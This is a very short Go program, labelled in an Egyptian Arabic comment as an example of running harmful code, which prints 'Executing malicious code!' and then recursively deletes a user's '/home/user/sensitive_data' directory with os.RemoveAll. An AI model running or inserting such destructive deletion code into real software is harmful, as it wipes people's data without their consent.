package main

import "fmt"
import "os"

func main() {
    fmt.Println("Executing malicious code!")
    os.RemoveAll("/home/user/sensitive_data") // ده مثال على تنفيذ أكواد ضارة
}
